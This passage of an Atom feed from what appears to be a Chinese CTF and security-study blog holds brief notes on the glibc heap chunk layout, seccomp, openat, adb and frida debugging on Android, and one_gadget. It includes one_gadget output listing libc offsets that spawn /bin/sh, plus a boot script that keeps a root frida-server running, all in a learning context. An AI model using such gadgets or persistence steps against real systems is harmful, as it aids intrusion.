    <category term="pwndbg" scheme="http://example.com/categories/Pwn/linux/tool/pwndbg/"/>
    
    
  </entry>
  
  <entry>
    <title>堆结构</title>
    <link href="http://example.com/2024/06/08/Pwn/linux/%E5%A0%86/%E5%A0%86%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2024/06/08/Pwn/linux/%E5%A0%86/%E5%A0%86%E7%BB%93%E6%9E%84/</id>
    <published>2024-06-08T09:02:22.000Z</published>
    <updated>2024-06-08T10:20:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>已经申请的堆结构类似于下面</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> prev_size;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> size;<span class="comment">//注意4字节对齐,&amp;表示整过</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">int</span> flag:<span class="number">3</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">            <span class="type">bool</span> PREV_INUSE:<span class="number">1</span>;<span class="comment">//如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</span></span><br><span class="line">            <span class="type">bool</span> IS_MAPPED:<span class="number">1</span>;<span class="comment">//记录当前chunk是否是由mmap分配的</span></span><br><span class="line">            <span class="type">bool</span> NON_MAIN_AREA:<span class="number">1</span>;<span class="comment">//记录当前 chunk 是否不属于主线程</span></span><br><span class="line">            &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="type">char</span>* data[(size&amp;<span class="number">0xFFFFFFF8</span>)<span class="number">-8</span>];<span class="comment">//只取高29位</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;已经申请的堆结构类似于下面&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;C&quot;&gt;&lt;figure class=&quot;iseeu highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    <category term="堆" scheme="http://example.com/categories/Pwn/linux/%E5%A0%86/"/>
    
    
  </entry>
  
  <entry>
    <title>api</title>
    <link href="http://example.com/2024/06/07/Web/Python/api/"/>
    <id>http://example.com/2024/06/07/Web/Python/api/</id>
    <published>2024-06-07T08:23:29.000Z</published>
    <updated>2024-06-07T08:24:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>os.path.join</p><p>以最后出现&#x2F;的字符串为基地址</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;os.path.join&lt;/p&gt;
&lt;p&gt;以最后出现&amp;#x2F;的字符串为基地址&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    <category term="Python" scheme="http://example.com/categories/Web/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>openat</title>
    <link href="http://example.com/2024/06/07/Pwn/linux/api/openat/"/>
    <id>http://example.com/2024/06/07/Pwn/linux/api/openat/</id>
    <published>2024-06-07T07:30:00.000Z</published>
    <updated>2024-06-07T07:37:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>open函数原型</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int openat(int dirfd, const char *pathname, int flags);</span><br><span class="line">int openat(int dirfd, const char *pathname, int flags, mode_t mode);</span><br></pre></td></tr></table></figure></div><p>fd参数如下</p><p><a class="link"   href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2uapi_2linux_2fcntl_8h.html" >Linux 内核：include&#x2F;uapi&#x2F;linux&#x2F;fcntl.h 文件参考 (huihoo.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AT_FDCWD -100</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;open函数原型&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Plaintext&quot;&gt;&lt;figure class=&quot;iseeu highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    <category term="api" scheme="http://example.com/categories/Pwn/linux/api/"/>
    
    
  </entry>
  
  <entry>
    <title>seccomp</title>
    <link href="http://example.com/2024/06/07/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/seccomp/"/>
    <id>http://example.com/2024/06/07/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/seccomp/</id>
    <published>2024-06-07T07:22:14.000Z</published>
    <updated>2024-06-08T18:13:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>Sandbox的安全机制，用于限制系统调用</p><p>可用seccomp-tools 来查看是否启用对应的沙箱检测</p><p><code>seccomp-tools dump 对应程序</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Sandbox的安全机制，用于限制系统调用&lt;/p&gt;
&lt;p&gt;可用seccomp-tools 来查看是否启用对应的沙箱检测&lt;/p&gt;
&lt;p&gt;&lt;code&gt;seccomp-tools dump 对应程序&lt;/code&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    <category term="保护措施" scheme="http://example.com/categories/Pwn/linux/%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/"/>
    
    
  </entry>
  
  <entry>
    <title>模拟发包</title>
    <link href="http://example.com/2024/06/03/Web/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/"/>
    <id>http://example.com/2024/06/03/Web/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/</id>
    <published>2024-06-03T14:55:17.000Z</published>
    <updated>2024-06-03T14:55:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>scapy</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;scapy&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>misc</title>
    <link href="http://example.com/2024/06/03/Re/%E5%AE%89%E5%8D%93/misc/"/>
    <id>http://example.com/2024/06/03/Re/%E5%AE%89%E5%8D%93/misc/</id>
    <published>2024-06-02T18:05:51.000Z</published>
    <updated>2024-06-02T18:15:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="应用操作"><a href="#应用操作" class="headerlink" title="应用操作"></a>应用操作</h2><h3 id="手动发送广播"><a href="#手动发送广播" class="headerlink" title="手动发送广播"></a>手动发送广播</h3><blockquote><p><a class="link"   href="https://www.cnblogs.com/tc310/p/11152853.html" >Android通过adb shell am broadcast发送广播 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="启动actvity"><a href="#启动actvity" class="headerlink" title="启动actvity"></a>启动actvity</h3><blockquote><p><a class="link"   href="https://www.cnblogs.com/yhjoker/p/8974119.html" >Android Studio 动态调试 apk 反编译出的 smali 代码 - yhjoker - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><code> adb shell am start -D -S -W packageName/ActivityName</code>    &#x2F;&#x2F;以调试状态运行目标activity </p></blockquote><h2 id="自启动任务"><a href="#自启动任务" class="headerlink" title="自启动任务"></a>自启动任务</h2><p>向<code>/data/adb/post-fs-data.d</code>写入自定义<code>.sh</code>文件即可</p><p>注意给xxx权限(<code>chmod +xxx</code>)</p><p>比如</p><blockquote><p>1、<code>su -c /data/local/tmp/frida-server-16.3.1-android-arm</code>写入frida.sh(名字任意)</p><p>2、<code>chmod +xxx frida.sh</code></p><p>重启后用frida hook任意应用,能hook即可</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;应用操作&quot;&gt;&lt;a href=&quot;#应用操作&quot; class=&quot;headerlink&quot; title=&quot;应用操作&quot;&gt;&lt;/a&gt;应用操作&lt;/h2&gt;&lt;h3 id=&quot;手动发送广播&quot;&gt;&lt;a href=&quot;#手动发送广播&quot; class=&quot;headerlink&quot; title=&quot;手动发送广</summary>
      
    
    
    
    <category term="Re" scheme="http://example.com/categories/Re/"/>
    
    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
    
    
  </entry>
  
  <entry>
    <title>自动任务</title>
    <link href="http://example.com/2024/06/02/Re/%E5%AE%89%E5%8D%93/%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1/"/>
    <id>http://example.com/2024/06/02/Re/%E5%AE%89%E5%8D%93/%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1/</id>
    <published>2024-06-02T10:06:19.000Z</published>
    <updated>2024-06-02T17:59:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>向<code>/data/adb/post-fs-data.d</code>写入自定义<code>.sh</code>文件即可</p><p>注意给xxx权限(<code>chmod +xxx</code>)</p><p>比如</p><blockquote><p>1、<code>su -c /data/local/tmp/frida-server-16.3.1-android-arm</code>写入frida.sh(名字任意)</p><p>2、<code>chmod +xxx frida.sh</code></p><p>重启后用frida hook任意应用,能hook即可</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;向&lt;code&gt;/data/adb/post-fs-data.d&lt;/code&gt;写入自定义&lt;code&gt;.sh&lt;/code&gt;文件即可&lt;/p&gt;
&lt;p&gt;注意给xxx权限(&lt;code&gt;chmod +xxx&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;比如&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、</summary>
      
    
    
    
    <category term="Re" scheme="http://example.com/categories/Re/"/>
    
    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
    
    
  </entry>
  
  <entry>
    <title>AndroidStudioemulator_Root</title>
    <link href="http://example.com/2024/05/29/Re/%E5%AE%89%E5%8D%93/AndroidStudioemulator_Root/"/>
    <id>http://example.com/2024/05/29/Re/%E5%AE%89%E5%8D%93/AndroidStudioemulator_Root/</id>
    <published>2024-05-28T17:15:59.000Z</published>
    <updated>2024-06-03T13:53:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>[<a class="link"   href="https://xdaforums.com/t/script-rootavd-root-your-android-studio-virtual-device-emulator-with-magisk-android-linux-darwin-macos-win-google-play-store-apis.4218123/" >SCRIPT] rootAVD - root your Android Studio Virtual Device emulator with Magisk [Android][Linux][Darwin&#x2F;MacOS][WIN][Google Play Store APIs] | XDA Forums <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[&lt;a class=&quot;link&quot;   href=&quot;https://xdaforums.com/t/script-rootavd-root-your-android-studio-virtual-device-emulator-with-magisk-android-linu</summary>
      
    
    
    
    <category term="Re" scheme="http://example.com/categories/Re/"/>
    
    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
    
    
  </entry>
  
  <entry>
    <title>one_gadget</title>
    <link href="http://example.com/2024/05/24/Pwn/linux/tool/one_gadget/"/>
    <id>http://example.com/2024/05/24/Pwn/linux/tool/one_gadget/</id>
    <published>2024-05-24T15:19:18.000Z</published>
    <updated>2024-06-08T18:11:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>可通过glibc来获取shell</p><p><code>pip3 install one_gadget</code>安装即可</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><blockquote><p>通过<code>one_gadget libc路径</code>找到对应的 <code>get shell</code>地址和 <code>get shell</code>的条件</p><p>如下面的</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(wrwrw㉿DESKTOP-1DM15A6)-[~]</span><br><span class="line">└─$ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x4d74c posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x68 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rax == NULL || &#123;&quot;sh&quot;, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br><span class="line"></span><br><span class="line">0x4d753 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x68 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br><span class="line"></span><br><span class="line">0xd636b execve(&quot;/bin/sh&quot;, rbp-0x40, r13)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x38 is writable</span><br><span class="line">  rdi == NULL || &#123;&quot;/bin/sh&quot;, rdi, NULL&#125; is a valid argv</span><br><span class="line">  [r13] == NULL || r13 == NULL || r13 is a valid envp</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>例如</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4d74c posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)#posix_spawn 类似于system 也是执行函数</span><br><span class="line">constraints:#获取shell的约束条件 </span><br><span class="line">  address rsp+0x68 is writable#rsp+0x68是可写的</span><br><span class="line">  rsp &amp; 0xf == 0#rsp &amp; 0xf为0</span><br><span class="line">  rax == NULL || &#123;&quot;sh&quot;, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br></pre></td></tr></table></figure></div></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可通过glibc来获取shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pip3 install one_gadget&lt;/code&gt;安装即可&lt;/p&gt;
&lt;h2 id=&quot;Example&quot;&gt;&lt;a href=&quot;#Example&quot; class=&quot;headerlink&quot; title=&quot;Exampl</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
    
    <category term="tool" scheme="http://example.com/categories/Pwn/linux/tool/"/>
    
    
  </entry>
  
</feed>
